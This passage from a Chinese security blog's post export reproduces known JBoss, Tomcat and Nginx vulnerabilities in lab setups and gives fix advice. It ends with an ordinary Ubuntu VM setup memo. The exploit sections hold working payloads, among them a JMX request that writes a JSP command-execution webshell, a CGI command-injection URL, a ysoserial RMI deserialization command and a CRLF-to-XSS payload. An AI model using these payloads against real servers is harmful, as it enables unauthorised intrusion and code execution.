<h3 id="store-方法（CVE-2007-1036）漏洞"><a href="#store-方法（CVE-2007-1036）漏洞" class="headerlink" title="store()方法（CVE-2007-1036）漏洞"></a>store()方法（CVE-2007-1036）漏洞</h3><p>利用的是后台中jboss.admin -&gt; DeploymentFileRepository -&gt; store()方法</p>
<p>payload</p>
<pre><code>http://192.168.11.12:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</code></pre><p>通过访问上面的url定位到store()方法</p>
<p><img src="/images/jboss/18.png" alt=""></p>
<p>通过拼接传入对应的jsp即可getshell，这里不再赘述。</p>
<h3 id="CVE-2010-0738漏洞"><a href="#CVE-2010-0738漏洞" class="headerlink" title="CVE-2010-0738漏洞"></a>CVE-2010-0738漏洞</h3><p>利用原理与CVE-2007-1036相同，只不过利用HEAD请求方法绕过GET和POST请求的限制</p>
<p><img src="/images/jboss/20.png" alt=""></p>
<pre><code>HEAD /jmx-console/HtmlAdaptor?
action=invokeOp&amp;name=jboss.admin:service=DeploymentFileRepository&amp;methodIn
dex=6&amp;arg0=../jmx-console.war/&amp;arg1=hax0rwin&amp;arg2=.jsp&amp;arg3=
&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;&amp;arg4=True </code></pre><h3 id="CVE-2005-5750漏洞"><a href="#CVE-2005-5750漏洞" class="headerlink" title="CVE-2005-5750漏洞"></a>CVE-2005-5750漏洞</h3><p>利用原理和CVE-2007-1036漏洞相同，只不过该漏洞利用methodIndex进行store()方法的调用。其中methodIndex是通过方法的编号进行调用。这里不再赘述。</p>
<h2 id="JBoss-seam2模板注入（CVE-2010-1871）"><a href="#JBoss-seam2模板注入（CVE-2010-1871）" class="headerlink" title="JBoss seam2模板注入（CVE-2010-1871）"></a>JBoss seam2模板注入（CVE-2010-1871）</h2><p>参考：<a href="https://www.freebuf.com/vuls/186948.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/186948.html</a></p>
<p>payload</p>
<pre><code>http://192.168.11.12:8080/admin-console/login.seam?actionOutcome=/success.xhtml?user%3d%23{command}</code></pre><h1 id="尾巴："><a href="#尾巴：" class="headerlink" title="尾巴："></a>尾巴：</h1><p>相比于其他中间件，JBoss的漏洞主要偏向于java反序列化攻击，一个反序列化攻击的影响是极大的。甚至一个是管理员的疏忽导致的弱口令或者未授权都可能导致被getshell。</p>
<hr>
<p><strong>声明：</strong></p>
<ul>
<li>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>中间件漏洞之Tomcat</title>
    <url>/2020/04/12/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BTomcat/</url>
    <content><![CDATA[<p>中间件Tomcat漏洞的一次总结<a id="more"></a></p>
<h1 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h1><blockquote>
<p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。</p>
</blockquote>
<h1 id="Tomcat常见漏洞整理："><a href="#Tomcat常见漏洞整理：" class="headerlink" title="Tomcat常见漏洞整理："></a>Tomcat常见漏洞整理：</h1><p><img src="/images/tomcat/Tomcat.png" alt=""></p>
<h2 id="后台弱口令上传war包Getshell漏洞"><a href="#后台弱口令上传war包Getshell漏洞" class="headerlink" title="后台弱口令上传war包Getshell漏洞"></a>后台弱口令上传war包Getshell漏洞</h2><p>1、修改conf/tomcat-users.xml文件的中配置用户的权限：<br><a href="http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html" target="_blank" rel="noopener">Configuring Manager Application Access</a></p>
<pre><code>&lt;tomcat-users&gt;
&lt;role rolename=&quot;manager-gui&quot;/&gt;
&lt;role rolename=&quot;manager-script&quot;/&gt;
&lt;role rolename=&quot;manager-jmx&quot;/&gt;
&lt;role rolename=&quot;manager-status&quot;/&gt;
&lt;role rolename=&quot;admin-gui&quot;/&gt;
&lt;role rolename=&quot;admin-script&quot;/&gt;
&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; /&gt;</code></pre><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p>
<p>2、我们访问：</p>
<pre><code>http://test.com:8080/manager/html/</code></pre><p>输入弱密码：tomcat：tomcat。登陆到后台</p>
<p>3、选择一个jsp生成war包并且上传</p>
<pre><code>jar -cvf job.war job.jsp
or
zip -r job.zip job.jsp &amp;&amp; mv job.zip job.war</code></pre><p><img src="/images/tomcat/1.png" alt=""></p>
<p>上传成功我们可以看到返回包的路径</p>
<p><img src="/images/tomcat/2.png" alt=""></p>
<p>访问：</p>
<pre><code>http://test.com:8080/上传war包名/文件名</code></pre><p>例如：</p>
<pre><code>http://test.com:8080/job/job.jsp</code></pre><p><img src="/images/tomcat/3.png" alt=""></p>
<h2 id="PUT方法任意文件写入（CVE-2017-12615）"><a href="#PUT方法任意文件写入（CVE-2017-12615）" class="headerlink" title="PUT方法任意文件写入（CVE-2017-12615）"></a>PUT方法任意文件写入（CVE-2017-12615）</h2><p>修改/conf/web.xml</p>
<p><img src="/images/tomcat/5.png" alt=""></p>
<p>直接PUT方法发送数据包即可在Web根目录写入shell：</p>
<p>（readonly=false）<br><img src="/images/tomcat/4.png" alt=""></p>
<p>成功写入文件，之后访问一下web根目录<br><img src="/images/tomcat/6.png" alt=""></p>
<p>（readonly=true）<br><img src="/images/tomcat/7.png" alt=""></p>
<p>更改配置之后返回403，不再可以写入<br><img src="/images/tomcat/8.png" alt=""></p>
<h2 id="远程代码执行（CVE-2019-0232）"><a href="#远程代码执行（CVE-2019-0232）" class="headerlink" title="远程代码执行（CVE-2019-0232）"></a>远程代码执行（CVE-2019-0232）</h2><p>影响版本：</p>
<pre><code>9.0.0.M1 ~ 9.0.17, 8.5.0 ~ 8.5.39 ， 7.0.0 ~ 7.0.93</code></pre><p>影响系统及条件：</p>
<pre><code>Windows
启用了CGI Servlet（默认为关闭）
启用了enableCmdLineArguments（Tomcat 9.0.*及后续版本默认关闭）</code></pre><p>1、环境搭建：</p>
<pre><code>#本次使用的环境为：
Windows 10
jre：1.8.0_241
apache-tomcat-8.5.39</code></pre><p>（1）、启用CGI Servlet（修改conf/web.xml）</p>
<p><img src="/images/tomcat/9.png" alt=""><br><img src="/images/tomcat/10.png" alt=""></p>
<pre><code>&lt;init-param&gt;
  &lt;param-name&gt;debug&lt;/param-name&gt;
  &lt;param-value&gt;0&lt;/param-value&gt;
&lt;/init-param&gt;
&lt;init-param&gt;
  &lt;param-name&gt;executable&lt;/param-name&gt;
  &lt;param-value&gt;&lt;/param-value&gt;
&lt;/init-param&gt;</code></pre><p>（2）、给予CGI_Servlet启动权限（修改conf/content.xml）</p>
<p><img src="/images/tomcat/11.png" alt=""></p>
<pre><code>&lt;Context privileged=&quot;true&quot;&gt;</code></pre><p>（3）、在webapps\ROOT\WEB-INF新建一个cgi目录（这个取决于<br>cgiPathPrefix的param-value的值”WEB-INF/cgi”）然后新建一个test.bat内容任意。</p>
<p><img src="/images/tomcat/12.png" alt=""></p>
<p>2、漏洞复现：</p>
<p>payload：</p>
<pre><code>http://localhost:8080/cgi-bin/test.bat?&amp;dir</code></pre><p><img src="/images/tomcat/13.png" alt=""></p>
<pre><code>http://localhost:8080/cgi-bin/test.bat?&amp;C:/WINDOWS/system32/net+user</code></pre><p><img src="/images/tomcat/14.png" alt=""></p>
<p>3、修复建议：</p>
<pre><code>1、安装Apache Tomcat官方补丁升级进行防护
2、将CGI Servlet初始化参数enableCmdLineArguments设置为false</code></pre><h2 id="manager-暴力破解（burp）"><a href="#manager-暴力破解（burp）" class="headerlink" title="manager 暴力破解（burp）"></a>manager 暴力破解（burp）</h2><p>1、环境搭建</p>
<p>添加如下代码：（在conf/tomcat-users.xml）</p>
<p><img src="/images/tomcat/15.png" alt=""></p>
<pre><code>&lt;role rolename=&quot;tomcat-gui&quot;/&gt;
&lt;role rolename=&quot;manager-gui&quot;/&gt;
&lt;role rolename=&quot;manager-script&quot;/&gt;
&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui&quot;/&gt;
&lt;user username=&quot;admin&quot; password=&quot;123456&quot; roles=&quot;tomcat-gui,manager-gui,manager-script&quot;/&gt;</code></pre><p>2、使用burp进行暴力破解:</p>
<p>（1）、访问 <a href="http://localhost:8080/manager/html" target="_blank" rel="noopener">http://localhost:8080/manager/html</a> 截取如下包：</p>
<p><img src="/images/tomcat/16.png" alt=""></p>
<p>（2）、发送到intruder模块之后标记 dG9tY2F0OjEyMzQ1Ng</p>
<pre><code>payload type选择custom iterator
position 设置为3
（其中第一个为用户字典）
（第二个为：）
（第三个为密码字典）</code></pre><p><img src="/images/tomcat/17.png" alt=""></p>
<pre><code>最后添加如下rule和取消url编码</code></pre><p><img src="/images/tomcat/18.png" alt=""></p>
<p>（3）、开始爆破之后成功返回 200<br><img src="/images/tomcat/19.png" alt=""></p>
<p>进行解码<br><img src="/images/tomcat/20.png" alt=""></p>
<p>3、修复建议：</p>
<pre><code>如果没有必要取消manager功能
设置复杂性高的密码
设置manager只允许本地IP访问</code></pre><h2 id="反序列化漏洞-CVE-2016-8735"><a href="#反序列化漏洞-CVE-2016-8735" class="headerlink" title="反序列化漏洞(CVE-2016-8735)"></a>反序列化漏洞(CVE-2016-8735)</h2><p>影响版本：</p>
<pre><code>9.0.0.M1 ~ 9.0.0.M11
8.5.0 ~ 8.5.6
8.0.0.RC1 ~ 8.0.38
7.0.0 ~ 7.0.72
6.0.0 ~ 6.0.47</code></pre><p>1、环境搭建：</p>
<pre><code>#本次使用的环境为：
Windows 7
jre：1.7.0_80
apache-tomcat-8.5.39</code></pre><p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#jdk-7u80-oth-JPR" target="_blank" rel="noopener">jre下载</a></p>
<p><a href="https://archive.apache.org/dist/tomcat/tomcat-8/" target="_blank" rel="noopener">tomcat下载</a></p>
<p>（1）、启用JmxRemoteLifecycleListener功能监听（在conf/server.xml）</p>
<p><img src="/images/tomcat/21.png" alt=""></p>
<pre><code>&lt;Listener className=&quot;org.apache.catalina.mbeans.JmxRemoteLifecycleListener&quot; rmiRegistryPortPlatform=&quot;10001&quot; rmiServerPortPlatform=&quot;10002&quot; /&gt;</code></pre><p>(2)、下载对应版本的<a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.39/bin/extras/" target="_blank" rel="noopener">catalina-jmx-remote.jar</a>包和<a href="https://mvnrepository.com/artifact/org.codehaus.groovy/groovy/2.3.9" target="_blank" rel="noopener">groovy-2.3.9.jar</a>包,放到tomcat的lib目录下。</p>
<p>（3）、修改bin/catalina.bat，在Execute The Requested Command上面添加内容</p>
<p><img src="/images/tomcat/22.png" alt=""></p>
<pre><code>set CATALINA_OPTS=-Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false
#后面两个false分别代表：指定不使用SSL通讯、指定不需要密码验证</code></pre><p>（4）、修改完成之后启动tomcat，查看10001和10002的RMI服务端口是否运行。</p>
<p><img src="/images/tomcat/23.png" alt=""></p>
<p>2、漏洞复现：</p>
<p>使用<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>发送payload</p>
<pre><code>java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.11.14 10001 Groovy1 calc.exe</code></pre><p><img src="/images/tomcat/24.png" alt=""></p>
<p>成功弹出计算器（在使用jre-1.8.0_241的时候出现报错）</p>
<p>另外，POC的编写可以参考：<a href="https://blog.spoock.com/2019/09/20/cve-2016-8735/" target="_blank" rel="noopener">https://blog.spoock.com/2019/09/20/cve-2016-8735/</a></p>
<p>3、修复建议:</p>
<pre><code>更新对应的版本；
关闭JmxRemoteLifecycleListener功能，对jmx JmxRemoteLifecycleListener远程端口进行网络访问控制。</code></pre><h2 id="样例目录session操控漏洞"><a href="#样例目录session操控漏洞" class="headerlink" title="样例目录session操控漏洞"></a>样例目录session操控漏洞</h2><p>1、漏洞分析：</p>
<p>在webapps\examples\servlets\sessions.html</p>
<p><img src="/images/tomcat/25.png" alt=""></p>
<pre><code>String dataName = request.getParameter(&amp;quot;&lt;font color=&quot;#009900&quot;&gt;dataName&lt;/font&gt;&amp;quot;);//获取dataname参数的值
if (dataName != null &amp;amp;&amp;amp; dataName.length() &amp;gt; 0) {
    String dataValue = request.getParameter(&amp;quot;&lt;font color=&quot;#009900&quot;&gt;dataValue&lt;/font&gt;&amp;quot;);//获取dataValue参数的值
    session.setAttribute(dataName, dataValue);//将dataname和datavalue写入session
}</code></pre><p>通过表单用户提交的name和value这两个参数值。由request.getParameter()函数来获取这两个值，然后通过session.setAttribute()传递给session。从而可以通过前端页面去控制session的值来获取管理员权限。</p>
<p>2、环境搭建</p>
<pre><code>#本次使用的环境
jre：1.7.0_80
apache-tomcat-8.5.39</code></pre><p>在webapps\examples新建三个页面模拟登陆页面操控session获取权限</p>
<p><img src="/images/tomcat/26.png" alt=""><br><img src="/images/tomcat/27.png" alt=""><br><img src="/images/tomcat/28.png" alt=""></p>
<p>3、复现过程</p>
<p>（1）、访问登陆页面并抓包</p>
<pre><code>http://192.168.11.14:8080/examples/index.jsp</code></pre><p>由于没有管理员的session所以被302重定向到了login.jsp</p>
<p><img src="/images/tomcat/29.png" alt=""></p>
<p>(2)、操作session进入后台</p>
<p>打开：SessionExample</p>
<pre><code>http://192.168.11.14:8080/examples/servlets/servlet/SessionExample</code></pre><p>输入login：admin并且提交</p>
<p><img src="/images/tomcat/30.png" alt=""></p>
<p>提交后提示已经写入sessio<br><img src="/images/tomcat/31.png" alt=""></p>
<p>再次访问</p>
<pre><code>http://192.168.11.14:8080/examples/index.jsp</code></pre><p>这个时候提示登陆成功<br><img src="/images/tomcat/32.png" alt=""></p>
<h2 id="本地提权漏洞-CVE-2016-1240"><a href="#本地提权漏洞-CVE-2016-1240" class="headerlink" title="本地提权漏洞(CVE-2016-1240)"></a>本地提权漏洞(CVE-2016-1240)</h2><p>参考：<a href="https://www.jianshu.com/p/94e4feac245f" target="_blank" rel="noopener">https://www.jianshu.com/p/94e4feac245f</a></p>
<hr>
<ul>
<li>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>中间件漏洞之Nginx</title>
    <url>/2020/04/09/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BNginx/</url>
    <content><![CDATA[<p>中间件nginx常见漏洞记录<a id="more"></a></p>
<h1 id="Nginx简介"><a href="#Nginx简介" class="headerlink" title="Nginx简介"></a>Nginx简介</h1><blockquote>
<p>Nginx可以部署在网络上使用FastCGI脚本、SCGI处理程序、WSGI应用服务器或Phusion Passenger模块的动态HTTP内容，并可作为软件负载均衡器</p>
</blockquote>
<p>由于Nginx免费开源，并且在稳定性方面做得比较好，所以目前大部分Web服务器使用Nginx，所以我就把Nginx常见的漏洞再做一次复现与整理。</p>
<hr>
<h1 id="Nginx常见漏洞："><a href="#Nginx常见漏洞：" class="headerlink" title="Nginx常见漏洞："></a>Nginx常见漏洞：</h1><p><img src="https://i.imgur.com/fwCshWT.png" alt=""></p>
<h2 id="Nginx-配置错误导致漏洞："><a href="#Nginx-配置错误导致漏洞：" class="headerlink" title="Nginx 配置错误导致漏洞："></a>Nginx 配置错误导致漏洞：</h2><p>影响版本：与版本无关只和配置有关。</p>
<h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><p>漏洞配置：配置nginx下的*.conf</p>
<pre><code>server {
    location ~ \.php$ {
        root           /work/www/test;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;
        include        fastcgi_params;
        fastcgi_pass   unix:/tmp/php-fpm.sock;
    }
}


1、当我们输入test.png/xx.php 的时候nginx看到.php结尾的话会传给php fastcgi处理 --&gt;
2、php根据url映射寻找xx.php，发现不存在 --&gt;
3、由于cgi.fix_pathinfo是开启的，所以php会继续在路径中寻找文件，之后找到test.png以php形式来处理，至于/xx.php会被存储到PATH_INFO后丢弃。</code></pre><p>1.上传一个名为1.png的图片，图片中带有phpinfo(),可以看到response返回了图片地址。<br><img src="https://i.imgur.com/VEy5cjb.png" alt=""></p>
<p>2.访问图片地址，加上/xx.php</p>
<p><img src="https://i.imgur.com/2BRUQY6.png" alt=""></p>
<p><img src="https://i.imgur.com/vomYfpz.png" alt=""></p>
<h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h3><p><a href="https://www.nginx.cn/doc/standard/httpcore.html" target="_blank" rel="noopener">查看nginx的文档</a>，表示uri的有三个参数。</p>
<p>其中$uri和$document_uri表示URL解码后的请求路径；$request_uri不解码。</p>
<p>于是当传入%0a%0d的时候nginx会将$url和$document_uri进行解码，引入换行符，造成CRLF注入漏洞</p>
<p>错误配置：(nginx.conf)</p>
<pre><code>server {
        location / {
        return 302 https://$host$uri;    #原本目的：让http请求跳转到https上。
    }
}</code></pre><p>利用过程：</p>
<p>1.设置：burp拦截response包，当request被拦截的时候，也拦截response。</p>
<p><img src="https://i.imgur.com/HIScbFO.png" alt=""></p>
<p>2.访问payload</p>
<pre><code>#payload:
http://192.168.11.11:8080/%0aX-XSS-Protection:%200%0a%0d%0a%0d%3Cimg%20src=1%20onerror=alert(/xss/)%3E</code></pre><p>2.1 修改response包的Location端口号&lt;80</p>
<p><img src="https://i.imgur.com/JpaivIq.png" alt=""></p>
<p>成功弹出xss：</p>
<p><img src="https://i.imgur.com/7Pu8n4G.png" alt=""></p>
<p>2.2 使用CSP禁止iframe的跳转</p>
<p>具体参考:<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="noopener">P牛</a>的文章。</p>
<h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>错误配置：</p>
<pre><code>#在给nginx配置别名的时候/files映射到了/home/，那么如果在files加上../就相当于:/home/../于是就到了上一层目录
location /files {
        alias /home/;
    }</code></pre><p>利用过程：</p>
<p><img src="https://i.imgur.com/GeYDPd4.png" alt=""></p>
<p>修复方案：</p>
<pre><code>location /files/ {
        alias /home/;
    }</code></pre><h3 id="add-header被覆盖"><a href="#add-header被覆盖" class="headerlink" title="add_header被覆盖"></a>add_header被覆盖</h3><p>错误配置：</p>
<pre><code># 在添加add_header的时候覆盖了父块HTTP头
add_header Content-Security-Policy &quot;default-src &apos;self&apos;&quot;;
add_header X-Frame-Options DENY;

location = /test1 {
            rewrite ^(.*)$ /xss.html break;
    }

location = /test2 {
    add_header X-Content-Type-Options nosniff;
    rewrite ^(.*)$ /xss.html break;
}</code></pre><p>利用过程：</p>
<pre><code>test1使用默认头</code></pre><p><img src="https://i.imgur.com/55p7Yvy.png" alt=""></p>
<pre><code>test2添加X-Content-Type-Options头，导致add_header失效</code></pre><p><img src="https://i.imgur.com/KIFe561.png" alt=""></p>
<hr>
<h2 id="文件名逻辑漏洞（CVE-2013-4547）"><a href="#文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="文件名逻辑漏洞（CVE-2013-4547）"></a>文件名逻辑漏洞（CVE-2013-4547）</h2><p>影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p>
<p>漏洞配置：</p>
<pre><code>location ~ \.php$ {
    include        fastcgi_params;

    fastcgi_pass   127.0.0.1:9000;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;
    fastcgi_param  DOCUMENT_ROOT /var/www/html;
}</code></pre><p>由于空格的原因，让nginx错误的解析文件名，传递给fastcgi解析成php。是一个URI解析错误和错误获取文件名导致的漏洞</p>
<p>复现过程：</p>
<p>上传一个带有文件名带有空格的phpinfo.jpg<br><img src="https://i.imgur.com/E4YML3a.png" alt=""></p>
<p>上传成功，返回地址<br><img src="https://i.imgur.com/EYgMhO8.png" alt=""></p>
<p>更改文件名<br><img src="https://i.imgur.com/kas8oiW.png" alt=""></p>
<p>把..改为20 00成功解析phpinfo<br><img src="https://i.imgur.com/F1soYlP.png" alt=""></p>
<h2 id="越界读取缓存漏洞（CVE-2017-7529）"><a href="#越界读取缓存漏洞（CVE-2017-7529）" class="headerlink" title="越界读取缓存漏洞（CVE-2017-7529）"></a>越界读取缓存漏洞（CVE-2017-7529）</h2><p>影响版本：Nginx 0.5.6 - 1.13.2</p>
<p>POC：<a href="https://github.com/vulhub/vulhub/blob/master/nginx/CVE-2017-7529/poc.py" target="_blank" rel="noopener">CVE-2017-7529</a></p>
<p>结果读取到缓存头文件，HTTP返回包等信息</p>
<p><img src="https://i.imgur.com/PZFCYuJ.png" alt=""></p>
<p>参考：（更多具体参考）</p>
<p><a href="https://paper.seebug.org/353/" target="_blank" rel="noopener">https://paper.seebug.org/353/</a></p>
<h2 id="空字节任意代码执行漏洞"><a href="#空字节任意代码执行漏洞" class="headerlink" title="空字节任意代码执行漏洞"></a>空字节任意代码执行漏洞</h2><p>影响版本：nginx &lt;=0.8.37</p>
<p>在Fast-CGI关闭的状态下，文件路径 /xxx.jpg%00.php 会解析成PHP文件</p>
<h2 id="尾巴："><a href="#尾巴：" class="headerlink" title="尾巴："></a>尾巴：</h2><p>在复现nginx的过程中，不光光是复现这个漏洞这么简单，在复现的时候搭建环境的过程中，也更加对nginx一些配置有更深入的了解，整体来说这段时间收获还是蛮多的。（加油！）</p>
<hr>
<p><strong>声明：</strong></p>
<ul>
<li><p>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</p>
</li>
<li><p>本文属于<a href="https://aqyoung.github.io/" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>VM安装Linux之后会做的配置</title>
    <url>/2020/04/08/Linux%E5%AE%89%E8%A3%85%E5%8F%8A%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>备忘录：安装Linux操作系统之后我需要做的事情（以Ubuntu为例，在VMware安装）</p>
<p>—- 方便自己安装使用的备忘录，忽略即可。<a id="more"></a></p>
<h2 id="1、安装VMTools"><a href="#1、安装VMTools" class="headerlink" title="1、安装VMTools"></a>1、安装VMTools</h2><h3 id="1-1-找到虚拟机点击安装vmtools。"><a href="#1-1-找到虚拟机点击安装vmtools。" class="headerlink" title="1.1 找到虚拟机点击安装vmtools。"></a>1.1 找到虚拟机点击安装vmtools。</h3><p><img src="https://i.imgur.com/IaAlMEP.png" alt=""></p>
<h3 id="1-2-打开终端输入"><a href="#1-2-打开终端输入" class="headerlink" title="1.2 打开终端输入"></a>1.2 打开终端输入</h3><pre><code># 解压VMtools到指定目录
tar -zxvf /media/yang/VMware\ Tools/VMwareTools-10.3.10-12406962.tar.gz -C /home/yang/
# 开始安装，第一次输入yes，之后一路回车即可
./vmware-tools-distrib/vmware-install.pl 
# rm -rf vmware-tools-distrib/</code></pre><h2 id="2、配置更新源（Ubuntu-18-04-4）"><a href="#2、配置更新源（Ubuntu-18-04-4）" class="headerlink" title="2、配置更新源（Ubuntu 18.04.4）"></a>2、配置更新源（Ubuntu 18.04.4）</h2><pre><code># 备份更新源之后删除
sudo cp /etc/apt/sources.list /etc/apt/sources.list.back &amp;&amp; rm /etc/apt/sources.list
# 直接配置为阿里云的更新源
sudo tee /etc/apt/sources.list &lt;&lt;-&apos;EOF&apos;
deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
EOF</code></pre><h2 id="3、更新"><a href="#3、更新" class="headerlink" title="3、更新"></a>3、更新</h2><pre><code># 更新软件列表
sudo apt-get update
# 更新软件
sudo apt-get upgrade</code></pre><h2 id="4、安装docker"><a href="#4、安装docker" class="headerlink" title="4、安装docker"></a>4、安装docker</h2><p><a href="https://aqyoung.github.io/2020/04/05/docker%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">见docker简单使用指南</a></p>
<h2 id="5、配置ssh和静态ip（Ubuntu18-04）"><a href="#5、配置ssh和静态ip（Ubuntu18-04）" class="headerlink" title="5、配置ssh和静态ip（Ubuntu18.04）"></a>5、配置ssh和静态ip（Ubuntu18.04）</h2><h3 id="5-1-配置静态IP"><a href="#5-1-配置静态IP" class="headerlink" title="5.1 配置静态IP"></a>5.1 配置静态IP</h3><pre><code>cd /etc/netplan
ls
#看看是否有01-network-manager-all.yaml编辑他
vim 01-network-manager-all.yaml

# Let NetworkManager manage all devices on this system
network:
  version: 2
  renderer: NetworkManager
  ethernets:
     ens33: #配置的网卡名称,使用ifconfig -a查看得到
       dhcp4: no #dhcp4关闭
       addresses: [192.168.11.11/24] #设置本机IP及掩码
       gateway4: 192.168.11.2 #设置网关
       nameservers:
         addresses: [192.168.11.2] #设置DNS

# 使用命令，使静态ip生效。
sudo netplan apply</code></pre><h3 id="5-2-动态ip"><a href="#5-2-动态ip" class="headerlink" title="5.2 动态ip"></a>5.2 动态ip</h3><pre><code>network:
  version: 2
  renderer: NetworkManager
  ethernets:
     enp3s0: #配置的网卡名称,使用ifconfig -a查看得到
       dhcp4: true #dhcp4开启
       addresses: [] #设置本机IP及掩码，空
       optional: true</code></pre><h3 id="5-3-安装ssh服务并设置开机自启动"><a href="#5-3-安装ssh服务并设置开机自启动" class="headerlink" title="5.3 安装ssh服务并设置开机自启动"></a>5.3 安装ssh服务并设置开机自启动</h3><pre><code>#安装ssh服务
sudo apt-get install openssh-server

#启动ssh服务
sudo /etc/init.d/ssh start

#设置开机自启动
sudo systemctl enable ssh

#关闭ssh开机自动启动命令
sudo systemctl disable ssh

#单次开启ssh
sudo systemctl start ssh

#单次关闭ssh
sudo systemctl stop ssh

#设置好后重启
reboot</code></pre><h2 id="6、问题解决："><a href="#6、问题解决：" class="headerlink" title="6、问题解决："></a>6、问题解决：</h2><h3 id="6-2-Ubuntu的root账号无法登陆ssh"><a href="#6-2-Ubuntu的root账号无法登陆ssh" class="headerlink" title="6.2 Ubuntu的root账号无法登陆ssh"></a>6.2 Ubuntu的root账号无法登陆ssh</h3><pre><code>#！问题提示：
Permission denied, please try again

#问题解决：
# 编辑
vi /etc/ssh/sshd_config

# 修改如下：
# Authentication:
LoginGraceTime 120
#PermitRootLogin without-password
PermitRootLogin yes
StrictModes yes

# 重启ssh 
/etc/init.d/ssh restart</code></pre><h3 id="6-3-卸载gnome桌面（当桌面无法显示时候又想要保存数据）"><a href="#6-3-卸载gnome桌面（当桌面无法显示时候又想要保存数据）" class="headerlink" title="6.3 卸载gnome桌面（当桌面无法显示时候又想要保存数据）"></a>6.3 卸载gnome桌面（当桌面无法显示时候又想要保存数据）</h3><pre><code>#卸载gnome-shell主程序
sudo apt-get remove gnome-shell

#卸载gnome
sudo apt-get remove gnome

#卸载不需要的依赖关系
sudo apt-get autoremove

#彻底卸载删除gnome的相关配置文件
sudo apt-get purge gnome

#清理安装gnome时候留下的缓存程序软件包
sudo apt-get autoclean
sudo apt-get clean</code></pre><h3 id="6-4-pip-国内源提速"><a href="#6-4-pip-国内源提速" class="headerlink" title="6.4 pip 国内源提速"></a>6.4 pip 国内源提速</h3><pre><code>#国内镜像源
http://pypi.douban.com/  豆瓣
http://pypi.hustunique.com/  华中理工大学
http://pypi.sdutlinux.org/  山东理工大学
http://pypi.mirrors.ustc.edu.cn/  中国科学技术大学
https://pypi.tuna.tsinghua.edu.cn/simple 清华
http://mirrors.aliyun.com/pypi/simple/ 阿里</code></pre><h3 id="6-4-1-临时使用："><a href="#6-4-1-临时使用：" class="headerlink" title="6.4.1 临时使用："></a>6.4.1 临时使用：</h3><pre><code>例如：（-i 参数选择镜像源，这样就会从豆瓣开源镜像去安装scrapy库了）
pip install -i http://pypi.douban.com/  scrapy</code></pre><h3 id="6-4-2-永久使用："><a href="#6-4-2-永久使用：" class="headerlink" title="6.4.2 永久使用："></a>6.4.2 永久使用：</h3><p>Linux 创建一个配置文件并且设置豆瓣为镜像源（<strong>直接复制粘贴就可以了</strong>）</p>
<pre><code>mkdir ~/.pip &amp;&amp; touch ~/.pip/pip.conf
tee ~/.pip/pip.conf &lt;&lt;-&apos;EOF&apos;
[global]
index-url = https://pypi.doubanio.com/simple/
